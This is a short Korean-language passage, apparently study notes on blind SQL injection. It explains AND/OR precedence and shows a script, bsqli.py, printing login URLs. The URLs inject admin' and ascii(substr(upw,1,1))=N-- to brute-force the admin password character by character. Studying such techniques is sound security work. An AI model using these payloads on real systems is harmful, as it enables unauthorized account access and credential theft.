...
-- AND가 OR보다 우선 순위가 높다. uid가 admin이거나 upw가 빈문자열인 레코드 선택
...
```sh
$ python3 bsqli.py
# admin' and ascii(substr(upw,1,1))=97--&upw=, substr index는 1부터 시작한다고..
http://example.com/login?uid=admin%27+and+ascii%28substr%28upw%2C1%2C1%29%29%3D97--&upw= 
http://example.com/login?uid=admin%27+and+ascii%28substr%28upw%2C1%2C1%29%29%3D98--&upw=
http://example.com/login?uid=admin%27+and+ascii%28substr%28upw%2C1%2C1%29%29%3D99--&upw=
http://example.com/login?uid=admin%27+and+ascii%28substr%28upw%2C1%2C1%29%29%3D100--&upw=
http://example.com/login?uid=admin%27+and+ascii%28substr%28upw%2C1%2C1%29%29%3D101--&upw=
http://example.com/login?uid=admin%27+and+ascii%28substr%28upw%2C1%2C1%29%29%3D102--&upw=
```
